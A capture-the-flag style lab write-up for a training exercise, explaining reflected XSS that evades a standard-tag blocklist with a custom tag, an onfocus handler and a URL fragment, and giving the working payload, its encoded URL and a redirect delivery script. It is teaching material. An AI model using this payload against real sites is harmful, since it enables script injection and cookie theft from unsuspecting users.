# Lab Writeup: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

**Difficulty:** Practitioner  
**Category:** Cross-Site Scripting (XSS)  
**Platform:** PortSwigger Web Security Academy

---

## Objective

Perform a reflected XSS attack by injecting a **custom HTML tag** that automatically triggers `alert(document.cookie)` when the victim loads the crafted URL.

---

## Background

Some applications use blocklists to filter dangerous HTML tags like `<script>`, `<img>`, `<svg>`, etc. However, if the filter only blocks standard HTML tags and doesn't account for **custom (non-standard) elements**, an attacker can define their own tag names with event handlers to execute arbitrary JavaScript.

---

## Vulnerability

The search functionality reflects user input into the HTML response without properly sanitizing custom/unknown HTML tags. The server blocks all standard HTML tags but allows custom ones like `<xss>`, `<puku>`, etc.

---

## Exploit Steps

### Step 1 — Craft the Payload

The custom tag payload used:

```html
<puku id=x onfocus=alert(document.cookie) tabindex=0>text</puku>
```

**Breakdown:**
| Part | Purpose |
|------|---------|
| `<puku>` | Custom (non-standard) HTML tag — bypasses the standard tag blocklist |
| `id=x` | Assigns an ID so it can be targeted via URL fragment (`#x`) |
| `onfocus=alert(document.cookie)` | Event handler that fires when the element receives focus |
| `tabindex=0` | Makes the element focusable by the browser |

### Step 2 — URL-Encode and Embed in Search Parameter

The payload is URL-encoded and passed as the `search` query parameter. The `#x` fragment at the end forces the browser to auto-focus the element with `id=x` on page load, triggering `onfocus` automatically.

**Final exploit URL structure:**

```
https://YOUR-LAB-ID.web-security-academy.net/?search=<puku+id=x+onfocus=alert(document.cookie)+tabindex=0>text</puku>#x
```

URL-encoded version:
```
?search=%3Cpuku+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3Etext%3C%2Fpuku%3E#x
```

### Step 3 — Deliver via Exploit Server

Paste the following script into the exploit server body, replacing `YOUR-LAB-ID`:

```html
<script>
  location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cpuku+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3Etext%3C%2Fpuku%3E#x';
</script>
```

Then click **Store** and **Deliver exploit to victim**.

---

## How It Works

1. The victim's browser loads the exploit URL via the redirect script.
2. The search term `<puku id=x onfocus=alert(document.cookie) tabindex=0>` is reflected into the HTML response body.
3. The `#x` fragment in the URL causes the browser to scroll to and **focus** the element with `id="x"`.
4. The `onfocus` event fires automatically, executing `alert(document.cookie)`.

---

## Key Takeaway

> Blocklists that only cover known/standard HTML tags are bypassed by custom tag names. Proper XSS mitigation requires **allowlisting** (only permit explicitly safe markup) rather than blocklisting.

---
